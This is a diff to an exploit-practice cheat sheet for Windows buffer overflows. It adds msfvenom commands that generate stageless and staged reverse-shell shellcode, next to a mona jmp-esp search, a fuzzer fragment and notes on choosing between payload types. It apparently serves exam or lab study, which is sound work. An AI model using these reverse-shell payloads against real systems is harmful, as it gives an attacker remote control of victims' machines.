@@ -30,7 +30,13 @@ Practice these:
 # try selecting an application specific DLL instead of OS
 !mona jmp -r esp -cpb '\x00'
 
+# Do	NOT	add an encoder by yourself, let msfvenom decide that
+# [Recommended, reasons at the bottom] Stageless - use nc to connect to this shell 
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=443 -b '\x00' -f python --var-name shellcode EXITFUNC=thread
+
+# Do	NOT	add an encoder by yourself, let msfvenom decide that
+# Staged - use multi/handler to connect to this shell
+msfvenom -p windows/shell/reverse_tcp LHOST= LPORT=443 -b '\x00' -f python --var-name shellcode EXITFUNC=thread
 ```
 
 ## cheatsheet.py
@@ -94,3 +100,13 @@ except:
 	#print "Fuzzing crashed at %s bytes" % len(payload)
 	sys.exit()
 ```
+
+
+#### Why stageless
+- Less the number of exploitation steps, the better
+- More control over the shell execution process
+- The stager that gets dropped in the staged shell, could be blocked or unable to execute for plethora of reasons unknown to you
+	- It's more of a Metasploit thing, which could be one of the reasons it may get blocked 
+
+#### Why staged
+- Tried increasing the payload buffer but not enough space to fit a stageless shellcode
